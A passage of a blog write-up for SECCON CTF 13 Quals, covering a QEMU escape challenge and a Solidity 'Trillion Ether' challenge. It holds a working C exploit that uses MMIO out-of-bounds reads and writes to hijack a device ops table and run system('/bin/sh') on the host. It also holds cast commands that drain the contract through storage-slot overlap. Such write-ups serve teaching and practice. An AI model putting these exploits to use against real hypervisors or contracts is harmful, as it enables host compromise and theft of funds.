+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/io.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MMIO_SET_OFFSET 0x0
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MMIO_GET_DATA   0x8
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MMIO_SET_DATA   0x8
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mmio_mem</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">mmio_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">mmio_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">weak_read_8</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">lower_val</span> <span class="o">=</span> <span class="nf">mmio_read</span><span class="p">(</span><span class="n">MMIO_GET_DATA</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lower_val</span> <span class="o">+=</span> <span class="p">((</span><span class="nf">mmio_read</span><span class="p">(</span><span class="n">MMIO_GET_DATA</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">lower_val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">weak_write_8</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_DATA</span><span class="p">,</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_DATA</span><span class="p">,</span> <span class="n">value</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">weak_write_4</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_OFFSET</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_write</span><span class="p">(</span><span class="n">MMIO_SET_DATA</span><span class="p">,</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">mmio_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/sys/devices/pci0000:00/0000:00:04.0/resource0&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[!] Cannot open /sys/devices/pci0000:00/0000:00:04.0/resource0</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mmio_mem</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">mmio_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[!] mmio error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] mmio done&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Get heap and pie leak
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">leaked_pie</span> <span class="o">=</span> <span class="nf">weak_read_8</span><span class="p">(</span><span class="o">-</span><span class="mh">0x90</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;leaked_pie = 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leaked_pie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">pie_base</span> <span class="o">=</span> <span class="n">leaked_pie</span> <span class="o">-</span> <span class="mh">0x72fa50</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;pie_base = 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pie_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">leaked_heap</span> <span class="o">=</span> <span class="nf">weak_read_8</span><span class="p">(</span><span class="o">-</span><span class="mh">0x8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;leaked_heap = 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leaked_heap</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">buf_addr</span> <span class="o">=</span> <span class="n">leaked_heap</span> <span class="o">-</span> <span class="mh">0x1748</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Write /bin/sh in heap
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">weak_write_8</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x68732f6e69622f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Create fake_ops in buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">mmio_write_addr</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x3ae1b0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">system_plt</span> <span class="o">=</span> <span class="n">pie_base</span><span class="o">+</span><span class="mh">0x324150</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">weak_write_8</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="n">system_plt</span><span class="p">);</span> <span class="c1">// mmio_read get overwritten to system
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">weak_write_8</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span> <span class="n">mmio_write_addr</span><span class="p">);</span> <span class="c1">// keep mmio_write because we still need it
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Overwrite mmio.ops to point to our fake_ops
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">weak_write_8</span><span class="p">(</span><span class="o">-</span><span class="mh">0xc8</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Make opaque point to our string /bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">weak_write_4</span><span class="p">(</span><span class="o">-</span><span class="mh">0xc0</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Spawn shell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Trigger mmio_read&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mmio_read</span><span class="p">(</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We just need to upload the compiled executable to the server (via <code>wget</code>) and run it. This will allow us to escape QEMU and read the flag on the host.</p>
+<img src="https://i.imgur.com/0beVwKE.png"/>
+<blockquote>
+<p><strong>Flag: SECCON{q3mu_35c4p3_15_34513r_7h4n_y0u_7h1nk}</strong></p>
+</blockquote>
+<h1 id="blockchain">Blockchain</h1>
+<h2 id="trillion-ether">Trillion Ether</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Get Chance!</p>
+<p>nc trillion-ether.seccon.games 31337</p>
+</div>
+        </div>
+    </div>
+<figure><a class="lightgallery" href="https://i.imgur.com/ZQ0s1N7.png" title="https://i.imgur.com/ZQ0s1N7.png" data-thumbnail="https://i.imgur.com/ZQ0s1N7.png" data-sub-html="<h2>I first blooded this challenge :)</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/ZQ0s1N7.png"
+            data-srcset="https://i.imgur.com/ZQ0s1N7.png, https://i.imgur.com/ZQ0s1N7.png 1.5x, https://i.imgur.com/ZQ0s1N7.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/ZQ0s1N7.png" />
+    </a><figcaption class="image-caption">I first blooded this challenge :)</figcaption>
+    </figure>
+<h3 id="initial-analysis-1">Initial Analysis</h3>
+<p>In this challenge, we were given a file named <code>TrillionEther.sol</code>. Let&rsquo;s take a look at it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">28</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">TrillionEther</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">struct</span> <span class="nc">Wallet</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="nb">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Wallet</span><span class="p">[]</span> <span class="k">public</span> <span class="n">wallets</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">1</span><span class="n">_000_000_000_000</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">createWallet</span><span class="p">(</span><span class="kt">bytes32</span> <span class="nb">name</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallets</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">_newWallet</span><span class="p">(</span><span class="nb">name</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">fromWalletId</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">toWalletId</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wallets</span><span class="p">[</span><span class="n">fromWalletId</span><span class="p">].</span><span class="n">owner</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;not owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallets</span><span class="p">[</span><span class="n">fromWalletId</span><span class="p">].</span><span class="nb">balance</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallets</span><span class="p">[</span><span class="n">toWalletId</span><span class="p">].</span><span class="nb">balance</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">walletId</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wallets</span><span class="p">[</span><span class="n">walletId</span><span class="p">].</span><span class="n">owner</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;not owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallets</span><span class="p">[</span><span class="n">walletId</span><span class="p">].</span><span class="nb">balance</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">wallets</span><span class="p">[</span><span class="n">walletId</span><span class="p">].</span><span class="n">owner</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_newWallet</span><span class="p">(</span><span class="kt">bytes32</span> <span class="nb">name</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">balance</span><span class="p">,</span> <span class="kt">address</span> <span class="n">owner</span><span class="p">)</span> <span class="k">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="n">Wallet</span> <span class="k">storage</span> <span class="n">wallet</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallet</span> <span class="o">=</span> <span class="n">wallet</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallet</span><span class="p">.</span><span class="nb">name</span> <span class="o">=</span> <span class="nb">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallet</span><span class="p">.</span><span class="nb">balance</span> <span class="o">=</span> <span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallet</span><span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The goal is to drain the contract&rsquo;s native ether. Looking at the code, the bug is in the function <code>_newWallet</code>. The variable <code>wallet</code> is an uninitialized storage pointer, and due to this behavior, the <code>wallet.name = name</code> will actually overwrite storage slot 0.</p>
+<p>If we take a careful look at the contract, storage slot 0 is the location where the array <code>wallets</code> length is stored. This means when we call <code>createWallet</code>, the <code>bytes32 name</code> that we pass will actually overwrite the array length.</p>
+<h3 id="solution-1">Solution</h3>
+<p>Due to the previous bug, we can arbitrarily overwrite the array length. Now, let&rsquo;s take a step back and check the Solidity documentation regarding slot calculation. When you try to access an array which is stored in slot 0, the elements will be stored starting at slot <code>keccak256(abi.encode(0))</code>, and subsequent elements will be stored in adjacent slots. Due to the structure of the struct <code>Wallet</code>, each element will occupy 3 slots to store its struct elements.</p>
+<p>Based on this information, we can see that if we overwrite the array length to be large enough, there might be slot overlapping. After doing careful calculations, we find that if we:</p>
+<ul>
+<li>Create a wallet with name 0x0, the element will occupy:
+<ul>
+<li>slot 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 &lt;- name</li>
+<li>slot 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564 &lt;- balance</li>
+<li>slot 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565 &lt;- owner</li>
+</ul>
+</li>
+<li>Then, create a wallet with name <code>0x5555555555555555555555555555555555555555555555555555555555555555</code>:
+<ul>
+<li>It will overwrite the array length value with the name, so the new pushed element will occupy slot <code>(keccak256(abi.encode(0)) + 3*name) % 2**256</code>, which means the newly pushed element&rsquo;s slots start at <code>0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e562</code>.</li>
+</ul>
+</li>
+</ul>
+<p>We can observe that the second wallet&rsquo;s slots overlap with wallet <code>0x0</code>. Due to this overlap, the balance of wallet <code>0x0</code> is overwritten with the value of the <code>owner</code> of the second wallet.</p>
+<p>This causes wallet 0x0&rsquo;s balance to become huge, and we can easily withdraw 1 trillion ether now. To provide a better explanation, below is an illustration of what happens.</p>
+<img src="https://i.imgur.com/8EI5kMr.png"/>
+<p>As you can see in the above illustration, wallet 0&rsquo;s balance got overwritten due to the overlap :). So now, we can simply create those two wallets, and we will be able to withdraw the native ether via wallet <code>0x0</code>. I used <code>cast</code> to do it because I was too lazy to make a script.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast send 0x7013393E32Da593de8A12f177822866CE97003D7 &#34;createWallet(bytes32)&#34; -r http://trillion-ether.seccon.games:8545/8806acbc-e5be-4766-a14d-1cebde57117d --private-key 9b640389f84690617a07a96e1e0d4e9e89feab4c77f9844e5b28c81ec3a50206 -- 0x0000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">cast send 0x7013393E32Da593de8A12f177822866CE97003D7 &#34;createWallet(bytes32)&#34; -r http://trillion-ether.seccon.games:8545/8806acbc-e5be-4766-a14d-1cebde57117d --private-key 9b640389f84690617a07a96e1e0d4e9e89feab4c77f9844e5b28c81ec3a50206 -- 0x5555555555555555555555555555555555555555555555555555555555555555
+</span></span><span class="line"><span class="cl">cast send 0x7013393E32Da593de8A12f177822866CE97003D7 &#34;withdraw(uint256,uint256)&#34; -r http://trillion-ether.seccon.games:8545/8806acbc-e5be-4766-a14d-1cebde57117d --private-key 9b640389f84690617a07a96e1e0d4e9e89feab4c77f9844e5b28c81ec3a50206 -- 0 1000000000000000000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>Flag: SECCON{unb3l13-bubb13_64362072f002c1ea}</strong></p>
+</blockquote>
+<h1 id="social-media">Social Media</h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>
+                    
+                </span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/seccon-ctf-13-quals/" data-title="SECCON CTF 13 Quals" data-via="Chovid99" data-hashtags="Writeup,pwn,qemu,blockchain,evm,2024"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/seccon-ctf-13-quals/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/qemu/">Qemu</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a>,&nbsp;<a href="/tags/evm/">Evm</a>,&nbsp;<a href="/tags/2024/">2024</a></section>
+        <section>
+            
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/kalmarctf-2024/" class="prev" rel="prev" title="KalmarCTF 2024"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>KalmarCTF 2024</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
